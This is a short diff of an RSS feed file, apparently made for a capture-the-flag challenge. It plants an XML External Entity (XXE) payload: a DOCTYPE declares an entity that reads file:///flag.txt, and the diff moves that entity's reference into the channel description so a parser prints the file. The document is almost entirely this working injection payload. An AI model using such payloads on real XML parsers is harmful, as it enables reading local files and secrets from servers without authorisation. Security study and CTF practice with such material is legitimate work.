@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 
 <!DOCTYPE foo [
-	<!ELEMENT title ANY >
+	<!ELEMENT description ANY >
 	<!ENTITY xxe SYSTEM "file:///flag.txt" >]>
 
 
@@ -18,14 +18,14 @@
 	<title>PREQUEL</title>
 	<atom:link href="//www.prequeladventure.com/feed/" rel="self" type="application/rss+xml" />
 	<link>https://www.prequeladventure.com</link>
-	<description>The adventures of Katia Managan</description>
+	<description>&xxe;</description>
 	<lastBuildDate>Wed, 13 Mar 2019 18:16:05 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>hourly</sy:updatePeriod>
 	<sy:updateFrequency>1</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=4.7.11</generator>
 	<item>
-		<title>&xxe;</title>
+		<title>sdf</title>
 		<link>https://www.prequeladventure.com/2019/01/14718/</link>
 		<comments>https://www.prequeladventure.com/2019/01/14718/#respond</comments>
 		<pubDate>Thu, 31 Jan 2019 02:16:29 +0000</pubDate>
